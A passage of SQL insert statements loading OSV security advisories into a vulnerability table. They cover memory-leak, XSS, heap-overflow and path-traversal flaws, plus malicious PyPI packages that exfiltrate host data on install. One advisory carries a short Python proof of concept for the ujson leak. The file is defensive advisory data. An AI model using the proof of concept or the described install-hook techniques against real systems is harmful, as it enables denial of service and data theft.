"10.0.65", "10.0.65.dev1", "10.0.66", "10.0.66.dev1", "10.0.67.dev1", "10.0.67.dev2", "10.0.67.dev3", "10.0.68", "10.0.68.dev1", "10.0.69", "10.0.69.dev1", "10.0.7", "10.0.7.dev1", "10.0.7.dev2", "10.0.70", "10.0.70.dev1", "10.0.70.dev2", "10.0.70.dev3", "10.0.71", "10.0.71.dev2", "10.0.8", "10.0.8.dev1", "10.0.8.dev2", "10.0.8.dev3", "10.0.9", "10.0.9.dev2", "6.0.47", "6.0.48", "6.0.49", "6.0.50", "6.0.51", "6.0.52", "6.0.53", "6.0.54", "6.0.55", "7.0.0", "7.0.1", "7.0.10", "7.0.12", "7.0.16", "7.0.17", "7.0.18", "7.0.19", "7.0.2", "7.0.20", "7.0.21", "7.0.22", "7.0.23", "7.0.3", "7.0.5", "7.0.6", "7.0.7", "7.0.8", "7.0.9", "8.0.0", "8.0.1", "8.0.11", "8.0.2", "8.0.3", "8.0.4", "8.0.5", "8.0.6", "8.0.7", "8.0.9", "8.1.0", "8.1.1", "8.1.2", "8.1.3", "8.1.4", "8.1.5", "8.1.7", "8.1.8", "8.1.9", "8.2.0", "8.2.1", "8.2.2", "8.2.3", "8.2.4", "8.3.0", "8.3.1", "8.3.2", "8.3.3", "8.3.4", "8.3.7", "8.3.8", "8.3.9", "8.4.0", "8.4.1", "8.4.2", "8.4.3", "8.4.5", "8.4.6", "8.4.7", "8.5.0", "8.5.1", "8.5.3", "8.5.6", "8.6.3", "8.6.4", "8.6.5", "8.6.6", "8.6.7", "8.6.8", "8.6.9", "8.7.0", "8.7.1", "8.7.2", "8.7.3", "8.7.4", "8.7.5", "8.7.6", "8.7.7", "8.7.8", "8.7.9", "8.8.0", "8.8.1", "8.8.2", "8.8.3", "8.8.4", "8.8.5", "8.8.6", "8.8.7", "8.8.8", "8.9.0", "8.9.1", "8.9.2", "8.9.3", "8.9.4", "8.9.5", "8.9.7", "8.9.8", "8.9.9", "9.0.0", "9.0.1", "9.0.10", "9.0.11", "9.0.12", "9.0.13", "9.0.14", "9.0.15", "9.0.16", "9.0.17", "9.0.18", "9.0.19", "9.0.2", "9.0.20", "9.0.21", "9.0.22", "9.0.23", "9.0.24", "9.0.25", "9.0.26", "9.0.27", "9.0.28", "9.0.29", "9.0.3", "9.0.30", "9.0.31", "9.0.33", "9.0.34", "9.0.35", "9.0.37", "9.0.38", "9.0.39", "9.0.4", "9.0.40", "9.0.41", "9.0.42", "9.0.43", "9.0.44", "9.0.5", "9.0.6", "9.0.61", "9.0.62", "9.0.63", "9.0.65", "9.0.66", "9.0.67", "9.0.68", "9.0.69", "9.0.70", "9.0.71", "9.0.72", "9.0.73", "9.0.74", "9.0.75", "9.0.78", "9.0.8", "9.0.81", "9.0.82", "9.0.83", "9.0.84", "9.0.85", "9.0.87", "9.0.88", "9.0.89", "9.0.9", "9.0.90", "9.1.1", "9.1.10", "9.1.13", "9.1.14", "9.1.15", "9.1.16", "9.1.17", "9.1.18", "9.1.19", "9.1.20", "9.1.23", "9.1.24", "9.1.25", "9.1.26", "9.1.27", "9.1.28", "9.1.29", "9.1.3", "9.1.30", "9.1.31", "9.1.32", "9.1.33", "9.1.34", "9.1.35", "9.1.36", "9.1.38", "9.1.39", "9.1.4", "9.1.42", "9.1.43", "9.1.44", "9.1.45", "9.1.46", "9.1.47", "9.1.48", "9.1.49", "9.1.5", "9.1.50", "9.1.51", "9.1.52", "9.1.53", "9.1.54", "9.1.55", "9.1.56", "9.1.57", "9.1.58", "9.1.59", "9.1.6", "9.1.60", "9.1.62", "9.1.63", "9.1.64", "9.1.65", "9.1.66", "9.1.67", "9.1.68", "9.1.69", "9.1.7", "9.1.70", "9.1.72", "9.1.74", "9.1.76", "9.1.77", "9.1.78", "9.1.8", "9.1.9", "9.2.10", "9.2.100", "9.2.101", "9.2.11", "9.2.13", "9.2.14", "9.2.15", "9.2.16", "9.2.17", "9.2.18", "9.2.19", "9.2.2", "9.2.20", "9.2.21", "9.2.22", "9.2.23", "9.2.24", "9.2.25", "9.2.26", "9.2.27", "9.2.29", "9.2.30", "9.2.31", "9.2.32", "9.2.34", "9.2.36", "9.2.38", "9.2.4", "9.2.40", "9.2.42", "9.2.43", "9.2.44", "9.2.47", "9.2.48", "9.2.5", "9.2.51", "9.2.52", "9.2.53", "9.2.54", "9.2.55", "9.2.56", "9.2.57", "9.2.61", "9.2.62", "9.2.63", "9.2.64", "9.2.65", "9.2.66", "9.2.67", "9.2.68", "9.2.69", "9.2.70", "9.2.71", "9.2.73", "9.2.76", "9.2.77", "9.2.78", "9.2.79", "9.2.8", "9.2.80", "9.2.83", "9.2.84", "9.2.85", "9.2.86", "9.2.87", "9.2.89", "9.2.9", "9.2.90", "9.2.91", "9.2.92", "9.2.93", "9.2.94", "9.2.95", "9.2.97", "9.2.98", "9.2.99", "9.3.10", "9.3.11", "9.3.11.dev1", "9.3.12", "9.3.13", "9.3.13.dev2", "9.3.13.dev5", "9.3.14", "9.3.15", "9.3.16", "9.3.17", "9.3.18", "9.3.18.dev1", "9.3.18.dev2", "9.3.18.dev3", "9.3.19", "9.3.19.dev1", "9.3.19.dev2", "9.3.19.dev3", "9.3.2", "9.3.20", "9.3.20.dev1", "9.3.20.dev3", "9.3.20.dev4", "9.3.20.dev5", "9.3.20.dev6", "9.3.21", "9.3.21.dev1", "9.3.21.dev2", "9.3.21.dev3", "9.3.21.dev4", "9.3.22", "9.3.22.dev1", "9.3.22.dev2", "9.3.22.dev3", "9.3.22.dev4", "9.3.23", "9.3.23.dev1", "9.3.23.dev2", "9.3.24", "9.3.25", "9.3.26", "9.3.27", "9.3.27.dev1", "9.3.28", "9.3.29", "9.3.3", "9.3.34", "9.3.35", "9.3.35.dev1", "9.3.35.dev2", "9.3.36", "9.3.36.dev1", "9.3.37", "9.3.38", "9.3.39", "9.3.4", "9.3.40", "9.3.41", "9.3.42", "9.3.43", "9.3.44", "9.3.45", "9.3.46", "9.3.47", "9.3.48", "9.3.49", "9.3.5", "9.3.50", "9.3.51", "9.3.52", "9.3.53", "9.3.54", "9.3.54.dev1", "9.3.55", "9.3.56", "9.3.56.dev1", "9.3.56.dev10", "9.3.56.dev11", "9.3.56.dev12", "9.3.56.dev13", "9.3.56.dev14", "9.3.56.dev15", "9.3.56.dev16", "9.3.56.dev17", "9.3.56.dev18", "9.3.56.dev19", "9.3.56.dev2", "9.3.56.dev20", "9.3.56.dev21", "9.3.56.dev22", "9.3.56.dev23", "9.3.56.dev24", "9.3.56.dev25", "9.3.56.dev26", "9.3.56.dev27", "9.3.56.dev28", "9.3.56.dev29", "9.3.56.dev3", "9.3.56.dev4", "9.3.56.dev5", "9.3.56.dev6", "9.3.56.dev7", "9.3.56.dev8", "9.3.56.dev9", "9.3.57", "9.3.58", "9.3.58.dev1", "9.3.58.dev2", "9.3.59", "9.3.59.dev1", "9.3.59.dev2", "9.3.59.dev3", "9.3.6", "9.3.60", "9.3.60.dev1", "9.3.61", "9.3.62", "9.3.63", "9.3.64", "9.3.65", "9.3.65.dev1", "9.3.65.dev2", "9.3.65.dev3", "9.3.66", "9.3.66.dev1", "9.3.66.dev2", "9.3.67", "9.3.68", "9.3.69", "9.3.7", "9.3.7.dev1", "9.3.7.dev2", "9.3.7.dev3", "9.3.70", "9.3.70.dev1", "9.3.70.dev2", "9.3.71", "9.3.72", "9.3.72.dev1", "9.3.73", "9.3.74", "9.3.74.dev1", "9.3.75", "9.3.76", "9.3.77", "9.3.78", "9.3.79", "9.3.79.dev1", "9.3.79.dev10", "9.3.79.dev2", "9.3.79.dev3", "9.3.79.dev4", "9.3.79.dev5", "9.3.79.dev6", "9.3.79.dev7", "9.3.79.dev8", "9.3.79.dev9", "9.3.8", "9.3.80", "9.3.80.dev1", "9.3.80.dev2", "9.3.80.dev3", "9.3.80.dev4", "9.3.80.dev5", "9.3.80.dev6", "9.3.81", "9.3.81.dev1", "9.3.82", "9.3.83", "9.3.83.dev1", "9.3.84", "9.3.85", "9.3.86", "9.3.87", "9.3.88", "9.3.89", "9.3.90", "9.3.91", "9.3.92", "9.3.93", "9.3.94", "9.3.95", "9.3.96", "9.3.97", "9.3.98", "9.3.99", "9.4.1", "9.4.10", "9.4.100", "9.4.101", "9.4.102", "9.4.103", "9.4.104", "9.4.105", "9.4.106", "9.4.106.dev1", "9.4.106.dev2", "9.4.106.dev3", "9.4.106.dev4", "9.4.106.dev5", "9.4.106.dev6", "9.4.107", "9.4.108", "9.4.109", "9.4.11", "9.4.110", "9.4.111", "9.4.113", "9.4.114", "9.4.115", "9.4.116", "9.4.117", "9.4.118", "9.4.119", "9.4.12", "9.4.120", "9.4.120.dev1", "9.4.121.dev1", "9.4.122.dev1", "9.4.123", "9.4.123.dev1", "9.4.124", "9.4.124.dev2", "9.4.13", "9.4.130", "9.4.131", "9.4.131.dev1", "9.4.132", "9.4.132.dev1", "9.4.133", "9.4.133.dev1", "9.4.134", "9.4.134.dev1", "9.4.134.dev2", "9.4.134.dev3", "9.4.134.dev4", "9.4.134.dev5", "9.4.134.dev6", "9.4.134.dev7", "9.4.135", "9.4.136", "9.4.137", "9.4.137.dev1", "9.4.138", "9.4.138.dev1", "9.4.139", "9.4.139.dev1", "9.4.139.dev2", "9.4.14", "9.4.141", "9.4.142", "9.4.143", "9.4.143.dev1", "9.4.144", "9.4.144.dev1", "9.4.145", "9.4.145.dev1", "9.4.145.dev2", "9.4.146", "9.4.146.dev1", "9.4.147", "9.4.147.dev1", "9.4.148", "9.4.148.dev1", "9.4.149", "9.4.149.dev1", "9.4.15", "9.4.150", "9.4.150.dev1", "9.4.151", "9.4.151.dev1", "9.4.152", "9.4.152.dev1", "9.4.153", "9.4.153.dev1", "9.4.154", "9.4.154.dev1", "9.4.155", "9.4.155.dev1", "9.4.156", "9.4.156.dev1", "9.4.157", "9.4.157.dev1", "9.4.158", "9.4.158.dev1", "9.4.159", "9.4.159.dev1", "9.4.16", "9.4.160", "9.4.160.dev1", "9.4.161", "9.4.161.dev1", "9.4.162.dev1", "9.4.163", "9.4.164", "9.4.164.dev1", "9.4.164.dev2", "9.4.165", "9.4.165.dev1", "9.4.166", "9.4.166.dev1", "9.4.167", "9.4.167.dev1", "9.4.168", "9.4.168.dev1", "9.4.168.dev2", "9.4.169", "9.4.169.dev1", "9.4.169.dev2", "9.4.17", "9.4.170", "9.4.171", "9.4.171.dev1", "9.4.172", "9.4.172.dev1", "9.4.173", "9.4.173.dev1", "9.4.174", "9.4.174.dev1", "9.4.175", "9.4.175.dev1", "9.4.176", "9.4.177", "9.4.178", "9.4.178.dev1", "9.4.178.dev15", "9.4.178.dev16", "9.4.178.dev17", "9.4.178.dev2", "9.4.178.dev3", "9.4.178.dev4", "9.4.178.dev5", "9.4.178.dev6", "9.4.178.dev7", "9.4.178.dev8", "9.4.179", "9.4.179.dev1", "9.4.18", "9.4.181", "9.4.182.dev1", "9.4.182.dev2", "9.4.183", "9.4.184.dev1", "9.4.184.dev4", "9.4.184.dev5", "9.4.184.dev6", "9.4.184.dev8", "9.4.184.dev9", "9.4.186", "9.4.186.dev1", "9.4.187", "9.4.187.dev5", "9.4.188", "9.4.188.dev1", "9.4.189", "9.4.189.dev1", "9.4.189.dev2", "9.4.189.dev3", "9.4.19", "9.4.190", "9.4.190.dev1", "9.4.190.dev2", "9.4.191", "9.4.191.dev1", "9.4.191.dev2", "9.4.192", "9.4.192.dev1", "9.4.192.dev2", "9.4.192.dev3", "9.4.193", "9.4.193.dev1", "9.4.193.dev2", "9.4.194", "9.4.194.dev1", "9.4.194.dev2", "9.4.194.dev3", "9.4.194.dev4", "9.4.194.dev5", "9.4.194.dev6", "9.4.195", "9.4.195.dev1", "9.4.196", "9.4.196.dev1", "9.4.197", "9.4.197.dev1", "9.4.197.dev3", "9.4.197.dev4", "9.4.197.dev5", "9.4.198", "9.4.198.dev1", "9.4.199", "9.4.199.dev1", "9.4.2", "9.4.20", "9.4.200", "9.4.200.dev1", "9.4.200.dev10", "9.4.200.dev3", "9.4.200.dev4", "9.4.200.dev5", "9.4.200.dev6", "9.4.200.dev7", "9.4.200.dev8", "9.4.200.dev9", "9.4.201", "9.4.202", "9.4.202.dev10", "9.4.202.dev11", "9.4.202.dev12", "9.4.202.dev13", "9.4.202.dev14", "9.4.202.dev15", "9.4.202.dev16", "9.4.202.dev17", "9.4.202.dev18", "9.4.202.dev2", "9.4.202.dev20", "9.4.202.dev21", "9.4.202.dev22", "9.4.202.dev23", "9.4.202.dev24", "9.4.202.dev25", "9.4.202.dev26", "9.4.202.dev27", "9.4.202.dev28", "9.4.202.dev29", "9.4.202.dev3", "9.4.202.dev30", "9.4.202.dev31", "9.4.202.dev33", "9.4.202.dev34", "9.4.202.dev35", "9.4.202.dev36", "9.4.202.dev4", "9.4.202.dev5", "9.4.202.dev6", "9.4.202.dev7", "9.4.202.dev8", "9.4.202.dev9", "9.4.203", "9.4.203.dev1", "9.4.204", "9.4.204.dev1", "9.4.205", "9.4.205.dev1", "9.4.205.dev2", "9.4.205.dev3", "9.4.205.dev4", "9.4.205.dev5", "9.4.206", "9.4.206.dev1", "9.4.207", "9.4.207.dev1", "9.4.207.dev2", "9.4.208", "9.4.208.dev1", "9.4.208.dev2", "9.4.208.dev3", "9.4.208.dev4", "9.4.208.dev5", "9.4.209", "9.4.209.dev1", "9.4.21", "9.4.210", "9.4.210.dev1", "9.4.211", "9.4.211.dev1", "9.4.211.dev2", "9.4.212", "9.4.212.dev1", "9.4.212.dev10", "9.4.212.dev11", "9.4.212.dev12", "9.4.212.dev13", "9.4.212.dev14", "9.4.212.dev15", "9.4.212.dev16", "9.4.212.dev17", "9.4.212.dev18", "9.4.212.dev19", "9.4.212.dev2", "9.4.212.dev20", "9.4.212.dev21", "9.4.212.dev22", "9.4.212.dev23", "9.4.212.dev24", "9.4.212.dev25", "9.4.212.dev26", "9.4.212.dev28", "9.4.212.dev29", "9.4.212.dev3", "9.4.212.dev30", "9.4.212.dev31", "9.4.212.dev32", "9.4.212.dev33", "9.4.212.dev34", "9.4.212.dev35", "9.4.212.dev36", "9.4.212.dev37", "9.4.212.dev38", "9.4.212.dev39", "9.4.212.dev4", "9.4.212.dev40", "9.4.212.dev41", "9.4.212.dev42", "9.4.212.dev43", "9.4.212.dev44", "9.4.212.dev45", "9.4.212.dev46", "9.4.212.dev47", "9.4.212.dev48", "9.4.212.dev49", "9.4.212.dev5", "9.4.212.dev50", "9.4.212.dev51", "9.4.212.dev52", "9.4.212.dev6", "9.4.212.dev7", "9.4.212.dev8", "9.4.212.dev9", "9.4.213", "9.4.213.dev1", "9.4.214", "9.4.214.dev3", "9.4.214.dev4", "9.4.214.dev5", "9.4.214.dev6", "9.4.214.dev7", "9.4.215", "9.4.215.dev1", "9.4.216", "9.4.216.dev1", "9.4.216.dev2", "9.4.216.dev3", "9.4.216.dev4", "9.4.216.dev5", "9.4.216.dev6", "9.4.217", "9.4.217.dev1", "9.4.218", "9.4.218.dev1", "9.4.219", "9.4.219.dev1", "9.4.219.dev2", "9.4.219.dev3", "9.4.219.dev4", "9.4.219.dev5", "9.4.219.dev6", "9.4.22", "9.4.220", "9.4.220.dev1", "9.4.221", "9.4.221.dev1", "9.4.222", "9.4.222.dev1", "9.4.223", "9.4.223.dev1", "9.4.224.dev1", "9.4.224.dev2", "9.4.224.dev3", "9.4.224.dev4", "9.4.224.dev5", "9.4.224.dev6", "9.4.224.dev7", "9.4.224.dev8", "9.4.23", "9.4.24", "9.4.25", "9.4.26", "9.4.27", "9.4.28", "9.4.29", "9.4.29.dev1", "9.4.29.dev2", "9.4.3", "9.4.30", "9.4.30.dev1", "9.4.31", "9.4.31.dev1", "9.4.31.dev2", "9.4.31.dev3", "9.4.31.dev4", "9.4.31.dev5", "9.4.32", "9.4.34", "9.4.35", "9.4.36", "9.4.36.dev1", "9.4.36.dev2", "9.4.36.dev3", "9.4.38", "9.4.39", "9.4.4", "9.4.40", "9.4.41", "9.4.41.dev1", "9.4.43", "9.4.44", "9.4.45", "9.4.46", "9.4.47", "9.4.48", "9.4.48.dev1", "9.4.48.dev2", "9.4.48.dev3", "9.4.48.dev4", "9.4.48.dev5", "9.4.48.dev6", "9.4.48.dev7", "9.4.48.dev8", "9.4.48.dev9", "9.4.49", "9.4.5", "9.4.50", "9.4.51", "9.4.52", "9.4.53", "9.4.55", "9.4.56", "9.4.56.dev1", "9.4.56.dev2", "9.4.56.dev3", "9.4.56.dev4", "9.4.56.dev5", "9.4.57", "9.4.58", "9.4.58.dev1", "9.4.59", "9.4.59.dev1", "9.4.59.dev3", "9.4.6", "9.4.61", "9.4.62", "9.4.62.dev1", "9.4.63", "9.4.65", "9.4.66", "9.4.68", "9.4.69", "9.4.69.dev1", "9.4.7", "9.4.70", "9.4.70.dev1", "9.4.71", "9.4.72", "9.4.73", "9.4.74", "9.4.74.dev1", "9.4.74.dev2", "9.4.75", "9.4.76", "9.4.77", "9.4.78", "9.4.79", "9.4.8", "9.4.80", "9.4.81", "9.4.82", "9.4.83", "9.4.84", "9.4.84.dev2", "9.4.85.dev10", "9.4.85.dev11", "9.4.85.dev12", "9.4.85.dev13", "9.4.85.dev14", "9.4.85.dev15", "9.4.85.dev16", "9.4.85.dev17", "9.4.85.dev18", "9.4.85.dev19", "9.4.85.dev2", "9.4.85.dev20", "9.4.85.dev21", "9.4.85.dev22", "9.4.85.dev23", "9.4.85.dev24", "9.4.85.dev25", "9.4.85.dev26", "9.4.85.dev27", "9.4.85.dev28", "9.4.85.dev29", "9.4.85.dev3", "9.4.85.dev30", "9.4.85.dev31", "9.4.85.dev35", "9.4.85.dev36", "9.4.85.dev37", "9.4.85.dev4", "9.4.85.dev5", "9.4.85.dev6", "9.4.85.dev7", "9.4.85.dev8", "9.4.85.dev9", "9.4.87.dev1", "9.4.87.dev2", "9.4.87.dev3", "9.4.87.dev4", "9.4.87.dev5", "9.4.87.dev6", "9.4.87.dev7", "9.4.87.dev8", "9.4.87.dev9", "9.4.88.dev2", "9.4.88.dev3", "9.4.88.dev4", "9.4.88.dev5", "9.4.88.dev6", "9.4.9", "9.4.92.dev1", "9.4.96", "9.4.96.dev1", "9.4.96.dev2", "9.4.97", "9.4.97.dev1", "9.4.98", "9.4.99"]'::jsonb, '0.0', '2022-05-13 01:53:52+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-c38f-wx89-p2xg', 'OSV', 'ujson', 'pypi', 'UltraJSON has a Memory Leak in ujson.dump() on Write Failure', '### Summary

When `ujson.dump()` writes to a file-like object and the write operation raises an exception, the serialized JSON string object is not decremented, leaking memory. Each failed write operation leaks the full size of the serialized payload.

Code that uses `ujson.dumps()` rather than `ujson.dump()` or only JSON load/decode methods is unaffected.

### Details

**Vulnerability Location:**
- `src/ujson/python/objToJSON.c:913` - `objToJSONFile()` function start
- `src/ujson/python/objToJSON.c:931` - Error return on write failure
- `src/ujson/python/objToJSON.c:942` - Early return without cleanup
 
**Root Cause:**

The `objToJSONFile()` function allocates a Python string object via `ujson_dumps_internal()`, calls the file''s `write()` method, and returns early if `write()` raises an exception—but never calls `Py_DECREF(string)` on the early exit path.

### PoC
```python
import gc, tracemalloc, ujson

class BadFile:
    def write(self, s):
        raise RuntimeError("boom")

obj = {"x": "A" * 200000}

def run():
    try:
        ujson.dump(obj, BadFile())
    except RuntimeError:
        pass

run()
tracemalloc.start()
gc.collect()
base = tracemalloc.get_traced_memory()[0]

for i in range(5):
    run()
    gc.collect()
    cur = tracemalloc.get_traced_memory()[0]
    print(i, cur - base)
```

### Impact

Any application that serializes data through `ujson.dump()` to an attacker-influenced file-like object that can fail can be driven into linear memory growth. An attacker can quickly use up all the memory of say a web server that sends JSON responses using `ujson.dump()` by repeatedly making requests then closing the connection mid response.

### Remediation

The missing dec-refs were added in 82af1d0ac01d09aa40c887b460d44b9d9f4bccd9. We recommend upgrading to [UltraJSON 5.12.1](https://github.com/ultrajson/ultrajson/releases/tag/5.12.1).

### Workarounds

Replacing `ujson.dump(obj, file)` with `file.write(ujson.dumps(obj))` is equivalent (contrary to popular misconception, there are no streaming benefits to using `ujson.dump()`) and will avoid the memory leak.', '["1.15", "1.18", "1.19", "1.21", "1.22", "1.23", "1.30", "1.33", "1.34", "1.35", "1.4", "1.6", "1.8", "1.9", "2.0.0", "2.0.1", "2.0.2", "2.0.3", "3.0.0", "3.1.0", "3.2.0", "4.0.0", "4.0.1", "4.0.2", "4.1.0", "4.2.0", "4.3.0", "5.0.0", "5.1.0", "5.10.0", "5.11.0", "5.12.0", "5.2.0", "5.3.0", "5.4.0", "5.5.0", "5.6.0", "5.7.0", "5.8.0", "5.9.0"]'::jsonb, '0.0', '2026-05-12 22:25:11+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-191802', 'OSV', 'netmanagement', 'pypi', 'Malicious code in netmanagement (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (9af8bc10bc4f751ad03dbe8257d2d8c49941accbf8b8fe6149d17a457fc56811)
The package appears to be a PoC of overwriting "requests" package files. The new "requests/__init__.py" takes over common requests features and uses the implementation that a) logs every request to a file (but no external exfiltration, this may also be expected in some situations); b) after every 5 requests, opens the calculator app. The second shows clearly that the intention is to present a security risk, not create a real package.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: 2025-08-netmanagement


Reasons (based on the campaign):


 - action-hidden-in-lib-usage


 - other
', '["0.1.1", "0.1.0"]'::jsonb, '0.0', '2025-09-07 16:49:12+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-2m34-jcjv-45xf', 'OSV', 'django', 'pypi', 'XSS in Django', 'An issue was discovered in Django version 2.2 before 2.2.13 and 3.0 before 3.0.7. Query parameters generated by the Django admin ForeignKeyRawIdWidget were not properly URL encoded, leading to a possibility of an XSS attack.', '["3.0", "3.0.1", "3.0.2", "3.0.3", "3.0.4", "3.0.5", "3.0.6", "3.0a1", "3.0b1", "3.0rc1"]'::jsonb, '0.0', '2020-06-05 16:24:28+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('PYSEC-2020-315', 'OSV', 'tensorflow-gpu', 'pypi', '', 'In Tensorflow before version 2.3.1, the `RaggedCountSparseOutput` implementation does not validate that the input arguments form a valid ragged tensor. In particular, there is no validation that the values in the `splits` tensor generate a valid partitioning of the `values` tensor. Thus, the code sets up conditions to cause a heap buffer overflow. A `BatchedMap` is equivalent to a vector where each element is a hashmap. However, if the first element of `splits_values` is not 0, `batch_idx` will never be 1, hence there will be no hashmap at index 0 in `per_batch_counts`. Trying to access that in the user code results in a segmentation fault. The issue is patched in commit 3cbb917b4714766030b28eba9fb41bb97ce9ee02 and is released in TensorFlow version 2.3.1.', '["0.12.0", "0.12.1", "1.0.0", "1.0.1", "1.1.0", "1.10.0", "1.10.1", "1.11.0", "1.12.0", "1.12.2", "1.12.3", "1.13.1", "1.13.2", "1.14.0", "1.15.0", "1.15.2", "1.15.3", "1.15.4", "1.15.5", "1.2.0", "1.2.1", "1.3.0", "1.4.0", "1.4.1", "1.5.0", "1.5.1", "1.6.0", "1.7.0", "1.7.1", "1.8.0", "1.9.0", "2.0.0", "2.0.1", "2.0.2", "2.0.3", "2.0.4", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.1.4", "2.2.0", "2.2.1", "2.2.2", "2.2.3", "2.3.0"]'::jsonb, '0.0', '2020-09-25 19:15:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-6458', 'OSV', 'atlasctf-21-prod-21', 'pypi', 'Malicious code in atlasctf-21-prod-21 (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (79c8505b253779798971bd98108a76e3e9ba4a7a590fa35b73eef9782c70616d)
On installation or importing, the package attempts to exfiltrate some basic information, e.g. /etc/passwd


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: 2025-06-atlasctf


Reasons (based on the campaign):


 - exfiltration-generic


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - The package overrides the install command in setup.py to execute malicious code during installation.
', '["99.99.99", "99.99.99.1"]'::jsonb, '0.0', '2025-06-07 14:05:45+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('GHSA-qf38-jq28-3ccq', 'OSV', 'apache-airflow-providers-sftp', 'pypi', 'Apache Airflow SFTP provider: Path traversal in SFTPHook.retrieve_directory', 'A path traversal in the SFTP provider (`SFTPHook.retrieve_directory` / `SFTPOperator(operation=get)`) let a malicious or compromised remote SFTP server write files outside the configured local destination directory via crafted directory-entry names. No Airflow account is required — the attack surface is any deployment downloading directories from an untrusted SFTP server. Upgrade `apache-airflow-providers-sftp` to 5.8.1 or later.', '["1.0.0", "1.0.0b1", "1.0.0b2", "1.0.0rc1", "1.1.0", "1.1.0rc1", "1.1.1", "1.1.1rc1", "1.2.0", "1.2.0rc1", "2.0.0", "2.0.0rc1", "2.0.0rc2", "2.1.0", "2.1.0rc1", "2.1.0rc2", "2.1.1", "2.1.1rc1", "2.2.0", "2.2.0rc1", "2.3.0", "2.3.0rc1", "2.4.0", "2.4.0rc1", "2.4.1", "2.4.1rc1", "2.5.0", "2.5.0rc1", "2.5.1", "2.5.1rc1", "2.5.2", "2.5.2rc1", "2.6.0", "2.6.0rc1", "3.0.0", "3.0.0rc1", "3.0.0rc2", "3.1.0rc1", "4.0.0", "4.0.0rc1", "4.1.0", "4.1.0rc1", "4.10.0", "4.10.0rc1", "4.10.1", "4.10.1rc1", "4.10.2", "4.10.2rc1", "4.10.3", "4.10.3rc1", "4.11.0", "4.11.0rc1", "4.11.1", "4.11.1rc1", "4.2.0", "4.2.0rc1", "4.2.1", "4.2.1rc1", "4.2.1rc2", "4.2.2", "4.2.2rc1", "4.2.3", "4.2.3rc1", "4.2.4", "4.2.4rc1", "4.3.0", "4.3.0rc1", "4.3.0rc2", "4.3.1", "4.3.1rc1", "4.4.0", "4.4.0rc1", "4.5.0", "4.5.0rc1", "4.6.0", "4.6.0rc1", "4.6.1", "4.6.1rc1", "4.7.0", "4.7.0rc1", "4.8.0", "4.8.0rc1", "4.8.1", "4.8.1rc1", "4.9.0", "4.9.0rc1", "4.9.1", "4.9.1rc1", "5.0.0", "5.0.0rc1", "5.0.0rc2", "5.1.0", "5.1.0rc1", "5.1.1", "5.1.1rc1", "5.1.2", "5.1.2rc1", "5.2.0", "5.2.0rc1", "5.2.1", "5.2.1rc1", "5.3.0", "5.3.0rc1", "5.3.1", "5.3.1rc1", "5.3.2", "5.3.2rc1", "5.3.3", "5.3.3rc1", "5.3.4", "5.3.4rc1", "5.4.0", "5.4.0rc1", "5.4.1", "5.4.1rc1", "5.4.2", "5.4.2rc1", "5.5.0", "5.5.0rc1", "5.5.1", "5.5.1rc1", "5.6.0", "5.6.0rc1", "5.7.0", "5.7.0rc1", "5.7.1", "5.7.1rc1", "5.7.2", "5.7.2rc1", "5.7.3", "5.7.3rc1", "5.7.4", "5.7.4rc1", "5.8.0", "5.8.0rc1", "5.8.1rc1"]'::jsonb, '0.0', '2026-06-17 18:35:51+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-6006', 'OSV', 'shimi', 'pypi', 'Malicious code in shimi (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0"]'::jsonb, '0.0', '2024-06-25 13:42:33+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-2503', 'OSV', 'genesis-1p-tools-rpm-bundle', 'pypi', 'Malicious code in genesis-1p-tools-rpm-bundle (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (d7a13386739eb38301be183f8fafa0281beef0adc59037619ca870c2b075cd58)
Installing the package or importing the module exfiltrates basic information about the host, and the package has no other purpose.


---

Category: PROBABLY_PENTEST - Packages looking like typical pentest packages, but also anything that looks like testing, exploring pre-prepared kits, research & co, with clearly low-harm possibilities.


Campaign: GENERIC-standard-pypi-install-pentest


Reasons (based on the campaign):


 - The package contains code to exfiltrate basic data from the system, like IP or username. It has a limited risk.


 - The package overrides the install command in setup.py to execute malicious code during installation.
', '["9.0.0", "9.0.1"]'::jsonb, '0.0', '2026-04-07 09:41:03+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-192382', 'OSV', 'raft-dask', 'pypi', 'Malicious code in raft-dask (PyPI)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: kam193 (030a53a896f5df53ae7114349ea26d0d00d132929f557c6b16ce9e2cdb217a0d)
Installing the package or importing the module exfiltrates basic information about the host, and the package has no other purpose.


---

